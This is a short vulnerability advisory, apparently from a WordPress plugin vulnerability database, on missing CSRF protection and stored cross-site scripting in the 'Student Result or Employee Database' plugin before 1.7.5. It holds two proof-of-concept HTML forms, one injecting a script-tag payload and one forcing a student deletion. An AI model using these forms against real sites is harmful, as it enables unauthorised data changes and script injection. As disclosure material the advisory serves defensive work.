## WordPress Plugin Vulnerabilities

# Student Result or Employee Database < 1.7.5 - Stored Cross Site Scripting via CSRF

### Description

The plugin does not have CSRF in its AJAX actions, allowing attackers to make logged in user with a role as low as contributor to add/edit and delete students via CSRF attacks. Furthermore, due to the lack of sanitisation and escaping, it could also lead to Stored Cross-Site scripting

### Proof of Concept

<html>
<body>
<form action="https://example.com/wp-admin/admin.php?action=ssr\_add\_st\_submit" method="POST">
<input type="hidden" name="rid" value='<script>alert(/XSS/)</script>' />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
<html>
<body>
<form action="https://example.com/wp-admin/admin.php?action= ssr\_del\_st\_submit" method="POST">
<input type="hidden" name="postID" value="<RID>" />
<input type="submit" value="Submit request" />
</form>
</body>
</html>
